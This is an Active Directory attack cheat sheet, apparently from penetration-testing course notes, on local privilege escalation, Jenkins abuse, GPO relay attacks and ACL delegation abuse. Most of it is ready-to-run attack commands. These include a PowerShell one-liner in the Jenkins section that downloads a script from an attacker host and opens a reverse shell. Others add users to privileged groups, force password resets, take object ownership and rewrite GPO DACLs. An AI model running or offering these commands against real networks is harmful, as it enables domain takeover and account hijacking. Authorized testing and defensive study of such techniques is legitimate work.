# 03 — ACL, GPO, Jenkins and Permission Delegation Abuse

> [!NOTE]
> Active Directory object delegation and GPO misconfigurations frequently provide direct privilege escalation vectors to Domain Admin without requiring credential dumping.

---

## Local Privilege Escalation (PowerUp / SCM Abuse)

When initial access is gained on a workstation or server, enumerate local privilege escalation vectors to obtain local `SYSTEM` or administrative rights.

```powershell
# Load PowerUp and run automated checks (Unquoted Service Paths, Modifiable Services, DLL Hijacking)
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks

# Service Abuse: Automatically modifies service binary path to add user to local Administrators group
Invoke-ServiceAbuse -Name '<VULNERABLE_SERVICE>' -Username '<DOMAIN>\<USER>' -Verbose

# Alternative automated local privilege escalation checker
.\winPEASx64.exe
```

---

## Jenkins CI/CD Pipeline Exploitation

Jenkins build servers frequently execute with elevated domain rights or interact with build scripts stored on shares.

### 1. Check Software Restriction Policies (AppLocker / SRP)
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

### 2. Jenkins Reverse Shell Execution
- Navigate to Jenkins Dashboard → Project → Configure → Build → Add build step → **Execute Windows batch command**.
- Inject a PowerShell reverse shell execution command (e.g. Nishang `Invoke-PowerShellTcp.ps1`):

```powershell
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port 4444"
```

---

## GPO Authentication Coercion & NTLM Relay Flow

Group Policy Objects can be abused to coerce domain computer/user accounts to authenticate back to an attacker-controlled relay server.

### Attack Sequence
1. Locate a target GPO or SYSVOL share with `Write` or `WriteDacl` permissions (`Get-DomainGPO` / `Get-DomainOU`).
2. Place a malicious `.lnk` shortcut file or modify the GPO configuration path to point to the attacker IP (`\\<ATTACKER_IP>\share`).
3. User or machine accounts process the link or GPO, sending NTLM authentication to `ntlmrelayx.py`.
4. Relay authentication to LDAP or a target host to escalate rights.

---

## GPO DACL Modification & Malicious Policy Injection

If an attacker holds `WriteDacl` or `GenericAll` over a GPO object, they can grant themselves full access and push malicious immediate scheduled tasks or local group modifications.

```cmd
# Relay shell DACL modification command
write_gpo_dacl <USER> <GPO_NAME_OR_GUID>

# Modify GPO remotely (gpowritty / GPO editing tools) to add user to local Administrators
net localgroup administrators <USER> /add
```

---

## Permission Delegation Attacks & Abuse Primitives

High-value domain objects (Users, Groups, OUs) may have non-standard Access Control Entries (ACEs) assigned to low-privileged accounts.

### Key Abuse Primitives

| Granted Right | Attack Primitive | Exploitation Command |
| :--- | :--- | :--- |
| **AddMembers** | Directly add attacker account to target group | `Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'` |
| **ForceChangePassword** | Reset target account password | `$pw = ConvertTo-SecureString 'P@ss123!' -AsPlainText -Force`<br>`Set-ADAccountPassword -Identity '<TARGET_USER>' -Reset -NewPassword $pw` |
| **GenericAll / WriteDacl** | Full control over target account | Modify `scriptpath`, reset password, or grant `DCSync` rights |
| **WriteOwner** | Change object ownership to attacker | `Set-DomainObjectOwner -TargetIdentity <TARGET> -PrincipalIdentity <USER>` |

```powershell
# Example: Adding member to group using PowerView
Add-DomainGroupMember -Identity 'DNSAdmins' -Members 'student1'

# Example: Force password reset using AD Module
$Password = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-ADAccountPassword -Identity 'svc_backup' -Reset -NewPassword $Password
Set-ADUser -Identity 'svc_backup' -ChangePasswordAtLogon $false
```

> [!TIP]
> **BloodHound Integration:** Use BloodHound to visually graph delegation paths such as `AddSelf`, `WriteDacl`, `GenericAll`, and `Owns`.
